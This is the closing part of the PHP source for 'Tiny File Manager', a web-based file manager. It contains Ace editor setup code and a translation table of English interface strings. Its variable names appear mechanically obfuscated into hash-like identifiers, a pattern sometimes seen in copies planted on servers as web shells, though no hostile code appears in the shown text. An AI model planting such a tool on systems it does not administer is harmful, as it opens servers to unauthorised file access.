                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                        editor.getSession().setUseWrapMode(wrapStatus);
                    }
                }
            });
            $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
                e.preventDefault();
                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                if(selectedValue && selectionType == "mode") {
                    editor.getSession().setMode(selectedValue);
                } else if(selectedValue && selectionType == "theme") {
                    editor.setTheme(selectedValue);
                }else if(selectedValue && selectionType == "fontSize") {
                    editor.setFontSize(parseInt(selectedValue));
                }
            });
        });
    </script>
<?php endif; ?>
<div id="snackbar"></div>
</body>
</html>
<?php
}

/**
 * Language Translation System
 * @param string $txt
 * @return string
 */
function lng($v0c35f1e3) {
    global $vdcd4149e;

    // English Language
    $v17d816fc['en']['AppName']        = 'Tiny File Manager';      $v17d816fc['en']['AppTitle']           = 'File Manager';
    $v17d816fc['en']['Login']          = 'Sign in';                $v17d816fc['en']['Username']           = 'Username';
    $v17d816fc['en']['Password']       = 'Password';               $v17d816fc['en']['Logout']             = 'Sign Out';
    $v17d816fc['en']['Move']           = 'Move';                   $v17d816fc['en']['Copy']               = 'Copy';
    $v17d816fc['en']['Save']           = 'Save';                   $v17d816fc['en']['SelectAll']          = 'Select all';
    $v17d816fc['en']['UnSelectAll']    = 'Unselect all';           $v17d816fc['en']['File']               = 'File';
    $v17d816fc['en']['Back']           = 'Back';                   $v17d816fc['en']['Size']               = 'Size';
    $v17d816fc['en']['Perms']          = 'Perms';                  $v17d816fc['en']['Modified']           = 'Modified';
    $v17d816fc['en']['Owner']          = 'Owner';                  $v17d816fc['en']['Search']             = 'Search';
    $v17d816fc['en']['NewItem']        = 'New Item';               $v17d816fc['en']['Folder']             = 'Folder';
    $v17d816fc['en']['Delete']         = 'Delete';                 $v17d816fc['en']['Rename']             = 'Rename';
    $v17d816fc['en']['CopyTo']         = 'Copy to';                $v17d816fc['en']['DirectLink']         = 'Direct link';
    $v17d816fc['en']['UploadingFiles'] = 'Upload Files';           $v17d816fc['en']['ChangePermissions']  = 'Change Permissions';
    $v17d816fc['en']['Copying']        = 'Copying';                $v17d816fc['en']['CreateNewItem']      = 'Create New Item';
    $v17d816fc['en']['Name']           = 'Name';                   $v17d816fc['en']['AdvancedEditor']     = 'Advanced Editor';
    $v17d816fc['en']['Actions']        = 'Actions';                $v17d816fc['en']['Folder is empty']    = 'Folder is empty';
    $v17d816fc['en']['Upload']         = 'Upload';                 $v17d816fc['en']['Cancel']             = 'Cancel';
    $v17d816fc['en']['InvertSelection']= 'Invert Selection';       $v17d816fc['en']['DestinationFolder']  = 'Destination Folder';
    $v17d816fc['en']['ItemType']       = 'Item Type';              $v17d816fc['en']['ItemName']           = 'Item Name';
    $v17d816fc['en']['CreateNow']      = 'Create Now';             $v17d816fc['en']['Download']           = 'Download';
    $v17d816fc['en']['Open']           = 'Open';                   $v17d816fc['en']['UnZip']              = 'UnZip';
    $v17d816fc['en']['UnZipToFolder']  = 'UnZip to folder';        $v17d816fc['en']['Edit']               = 'Edit';
    $v17d816fc['en']['NormalEditor']   = 'Normal Editor';          $v17d816fc['en']['BackUp']             = 'Back Up';
    $v17d816fc['en']['SourceFolder']   = 'Source Folder';          $v17d816fc['en']['Files']              = 'Files';
    $v17d816fc['en']['Move']           = 'Move';                   $v17d816fc['en']['Change']             = 'Change';
    $v17d816fc['en']['Settings']       = 'Settings';               $v17d816fc['en']['Language']           = 'Language';        
    $v17d816fc['en']['ErrorReporting'] = 'Error Reporting';        $v17d816fc['en']['ShowHiddenFiles']    = 'Show Hidden Files';
    $v17d816fc['en']['Help']           = 'Help';                   $v17d816fc['en']['Created']            = 'Created';
    $v17d816fc['en']['Help Documents'] = 'Help Documents';         $v17d816fc['en']['Report Issue']       = 'Report Issue';
    $v17d816fc['en']['Generate']       = 'Generate';               $v17d816fc['en']['FullSize']           = 'Full Size';              
    $v17d816fc['en']['HideColumns']    = 'Hide Perms/Owner columns';$v17d816fc['en']['You are logged in'] = 'You are logged in';
    $v17d816fc['en']['Nothing selected']   = 'Nothing selected';   $v17d816fc['en']['Paths must be not equal']    = 'Paths must be not equal';
    $v17d816fc['en']['Renamed from']       = 'Renamed from';       $v17d816fc['en']['Archive not unpacked']       = 'Archive not unpacked';
    $v17d816fc['en']['Deleted']            = 'Deleted';            $v17d816fc['en']['Archive not created']        = 'Archive not created';
    $v17d816fc['en']['Copied from']        = 'Copied from';        $v17d816fc['en']['Permissions changed']        = 'Permissions changed';
    $v17d816fc['en']['to']                 = 'to';                 $v17d816fc['en']['Saved Successfully']         = 'Saved Successfully';
    $v17d816fc['en']['not found!']         = 'not found!';         $v17d816fc['en']['File Saved Successfully']    = 'File Saved Successfully';
    $v17d816fc['en']['Archive']            = 'Archive';            $v17d816fc['en']['Permissions not changed']    = 'Permissions not changed';
    $v17d816fc['en']['Select folder']      = 'Select folder';      $v17d816fc['en']['Source path not defined']    = 'Source path not defined';
    $v17d816fc['en']['already exists']     = 'already exists';     $v17d816fc['en']['Error while moving from']    = 'Error while moving from';
    $v17d816fc['en']['Create archive?']    = 'Create archive?';    $v17d816fc['en']['Invalid file or folder name']    = 'Invalid file or folder name';
    $v17d816fc['en']['Archive unpacked']   = 'Archive unpacked';   $v17d816fc['en']['File extension is not allowed']  = 'File extension is not allowed';
    $v17d816fc['en']['Root path']          = 'Root path';          $v17d816fc['en']['Error while renaming from']  = 'Error while renaming from';
    $v17d816fc['en']['File not found']     = 'File not found';     $v17d816fc['en']['Error while deleting items'] = 'Error while deleting items';
    $v17d816fc['en']['Moved from']         = 'Moved from';         $v17d816fc['en']['Generate new password hash'] = 'Generate new password hash';
    $v17d816fc['en']['Login failed. Invalid username or password'] = 'Login failed. Invalid username or password';
    $v17d816fc['en']['password_hash not supported, Upgrade PHP version'] = 'password_hash not supported, Upgrade PHP version';
    $v17d816fc['en']['Advanced Search']    = 'Advanced Search';    $v17d816fc['en']['Error while copying from']    = 'Error while copying from';
    $v17d816fc['en']['Invalid characters in file name']                = 'Invalid characters in file name';
    $v17d816fc['en']['FILE EXTENSION HAS NOT SUPPORTED']               = 'FILE EXTENSION HAS NOT SUPPORTED';
    $v17d816fc['en']['Selected files and folder deleted']              = 'Selected files and folder deleted';
    $v17d816fc['en']['Error while fetching archive info']              = 'Error while fetching archive info';
    $v17d816fc['en']['Delete selected files and folders?']             = 'Delete selected files and folders?';
    $v17d816fc['en']['Search file in folder and subfolders...']        = 'Search file in folder and subfolders...';
    $v17d816fc['en']['Access denied. IP restriction applicable']       = 'Access denied. IP restriction applicable';
    $v17d816fc['en']['Invalid characters in file or folder name']      = 'Invalid characters in file or folder name';
    $v17d816fc['en']['Operations with archives are not available']     = 'Operations with archives are not available';
    $v17d816fc['en']['File or folder with this path already exists']   = 'File or folder with this path already exists';

    $vc2925025 = fm_get_translations($v17d816fc);
    $v17d816fc = $vc2925025 ? $vc2925025 : $v17d816fc;

    if (!strlen($vdcd4149e)) $vdcd4149e = 'en';
    if (isset($v17d816fc[$vdcd4149e][$v0c35f1e3])) return fm_enc($v17d816fc[$vdcd4149e][$v0c35f1e3]);
    else if (isset($v17d816fc['en'][$v0c35f1e3])) return fm_enc($v17d816fc['en'][$v0c35f1e3]);
    else return "$v0c35f1e3";
}

?>
